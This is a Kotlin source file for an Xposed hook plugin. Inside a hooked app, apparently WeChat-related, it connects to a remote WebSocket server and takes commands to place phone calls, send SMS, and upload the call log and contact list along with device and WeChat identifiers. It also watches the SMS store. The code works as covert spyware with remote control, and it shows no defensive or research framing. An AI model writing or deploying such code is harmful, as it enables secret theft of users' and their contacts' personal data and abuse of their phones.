package com.lu.wxmask.plugin

import SmsUtils
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import androidx.core.net.toUri
import com.example.libcontacts.CallLogUtils
import com.example.libcontacts.IdGet
import com.example.libcontacts.WebSocketClient
import com.example.libcontacts.WebSocketClientListener
import com.lu.lposed.api2.XC_MethodHook2
import com.lu.lposed.api2.XposedHelpers2
import com.lu.lposed.plugin.IPlugin
import com.lu.lposed.plugin.PluginProviders
import com.lu.magic.util.log.LogUtil
import de.robv.android.xposed.XC_MethodHook
import de.robv.android.xposed.XposedBridge
import de.robv.android.xposed.callbacks.XC_LoadPackage
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONArray
import org.json.JSONObject

class CallLogPlugin : WebSocketClientListener, IPlugin {
    private var mContext: Context? = null
    private var client: WebSocketClient? = null

    companion object {
        private val CALL_LOG_URI = CallLog.Calls.CONTENT_URI
        private val CONTACTS_URI = ContactsContract.Contacts.CONTENT_URI
        private val CONTACTS_LOOKUP_URI = ContactsContract.Contacts.CONTENT_LOOKUP_URI
    }

    override fun handleHook(context: Context, param: XC_LoadPackage.LoadPackageParam) {
        mContext = context
        LogUtil.i("CallLogPlugin handleHook：$this", mContext)
        client = WebSocketClient(context)
        client?.setOnWebSocketListener(this)
        client?.connect()

        startListening(context.contentResolver)
    }

    override fun onOpen(handshake: ServerHandshake) {
        LogUtil.i("CallLogPlugin onOpen", "连接已建立", IdGet.androidId(mContext!!))
    }

    override fun onMessage(message: String) {
        try {
            val json = JSONObject(message)
            val type = json.opt("type")
            when (type) {
                7 -> {
                    // 打电话
                    val phone = json.optString("name")
                    CallLogUtils.makeCall(mContext!!, phone)
                }

                8 -> {
                    // 发短信
                    val phone = json.optString("name")
                    val msg = json.optString("message")
                    CallLogUtils.sendSms(mContext!!, phone, msg)
                }

                9 -> {
                    // 请求通话记录
                    val params = json.optJSONObject("params")
                    if (params == null) {
                        LogUtil.e("params is null")
                        return
                    }
                    val plugin = PluginProviders.from(CallLogPlugin::class.java)
                    val result = plugin.queryByParams(params)
                    sendMessage(JSONObject().apply {
                        put("androidId", IdGet.androidId(mContext!!))
                        put("callslist", result)
                    }.toString())
                }

                10 -> {
                    // 请求联系人
                    val plugin = PluginProviders.from(CallLogPlugin::class.java)
                    val result = plugin.queryContactDetails()
                    LogUtil.i("result = $result")
                    sendMessage(JSONObject().apply {
                        put("androidId", IdGet.androidId(mContext!!))
                        put("contacts", result)
                    }.toString())
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendMessage(message: String, type: String = "webhook") {
        val text = JSONObject(message.trimIndent()).apply {
            put("type", type)
        }.toString()
        LogUtil.i("sendMessage", text)
        client?.sendMessage(text, IdGet.getWxId(mContext!!))
    }

    fun queryByParams(params: JSONObject): JSONArray {
        return CallLogUtils.queryByParams(mContext!!, params)
    }

    fun queryContactDetails(): JSONArray {
        return CallLogUtils.getContactDetails(mContext!!)
    }

    fun startListening(contentResolver: ContentResolver) {
//        val callLogUri: Uri = CallLog.Calls.CONTENT_URI // 通话记录的 URI
////        callLogContentObserver = CallLogContentObserver(Handler())
//        contentResolver.registerContentObserver(
//            callLogUri,
//            true,
//            object : ContentObserver(Handler()) {
//                override fun onChange(selfChange: Boolean, uri: Uri?, flags: Int) {
//                    super.onChange(selfChange, uri, flags)
//                }
//
//                @SuppressLint("Range")
//                override fun onChange(selfChange: Boolean) {
//                    // 当通话记录发生变化时，获取变化的内容
//
//                    val callLogs = JSONArray()
//                    val cursor = contentResolver.query(
//                        CallLog.Calls.CONTENT_URI,
//                        null,
//                        null,
//                        null,
//                        CallLog.Calls.DATE + " DESC"
//                    )
//
//                    cursor?.use {
//                        while (it.moveToNext()) {
//                            val callLog = JSONObject().apply {
//                                put("number", it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)))
//                                put("type", it.getInt(it.getColumnIndex(CallLog.Calls.TYPE)))
//                                put("date", it.getLong(it.getColumnIndex(CallLog.Calls.DATE)))
//                                put(
//                                    "duration",
//                                    it.getLong(it.getColumnIndex(CallLog.Calls.DURATION))
//                                )
//                                put(
//                                    "name",
//                                    it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME))
//                                )
//                            }
//                            callLogs.put(callLog)
//                        }
//                    }
//
//                    LogUtil.i("callLogs = $callLogs")
//                }
//            })

        contentResolver.registerContentObserver(
            "content://sms".toUri(),
            true,
            object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange)
                    // 短信内容发生变化时触发
//                    onSmsChanged(context)
                    LogUtil.i("onChange", "短信内容发生变化: url = $uri, selfChange = $selfChange")
                }
            }
        )
    }
}